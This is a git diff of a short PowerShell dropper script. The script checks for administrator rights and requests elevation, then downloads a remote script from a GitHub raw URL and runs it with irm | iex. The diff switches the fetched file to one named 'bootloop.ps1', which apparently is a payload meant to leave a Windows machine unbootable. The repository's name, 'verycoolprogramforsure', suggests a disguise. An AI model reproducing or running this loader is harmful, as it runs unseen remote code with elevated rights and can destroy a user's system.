@@ -1,3 +1,4 @@
+
 # 1. Check for Administrative privileges
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Write-Host "Requesting Administrative privileges..."
@@ -12,7 +13,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 Write-Host "Preparing for download..."
 
 # 2. Define the target URL
-$url = "https://raw.githubusercontent.com/itsverycoolbs/verycoolprogramforsure/main/fulltest.ps1"
+$url = "https://raw.githubusercontent.com/itsverycoolbs/verycoolprogramforsure/main/bootloop.ps1"
 
 # 3. Download and execute (irm | iex)
 try {
